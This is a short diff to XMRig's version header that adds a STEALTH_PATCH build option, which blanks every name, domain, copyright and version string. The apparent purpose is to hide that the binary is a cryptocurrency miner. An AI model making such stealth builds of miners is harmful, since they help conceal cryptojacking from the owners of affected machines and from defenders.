@@ -19,6 +19,23 @@
 #ifndef XMRIG_VERSION_H
 #define XMRIG_VERSION_H
 
+#ifdef STEALTH_PATCH
+
+#define APP_ID        ""
+#define APP_NAME      ""
+#define APP_DESC      ""
+#define APP_VERSION   ""
+#define APP_DOMAIN    ""
+#define APP_SITE      ""
+#define APP_COPYRIGHT ""
+#define APP_KIND      ""
+
+#define APP_VER_MAJOR  0
+#define APP_VER_MINOR  0
+#define APP_VER_PATCH  0
+
+#else
+
 #define APP_ID        "xmrig"
 #define APP_NAME      "XMRig"
 #define APP_DESC      "XMRig miner"
@@ -31,6 +48,8 @@
 #define APP_VER_MAJOR  6
 #define APP_VER_MINOR  22
 #define APP_VER_PATCH  0
+
+#endif // STEALTH_PATCH
 
 #ifdef _MSC_VER
 #   if (_MSC_VER >= 1930)
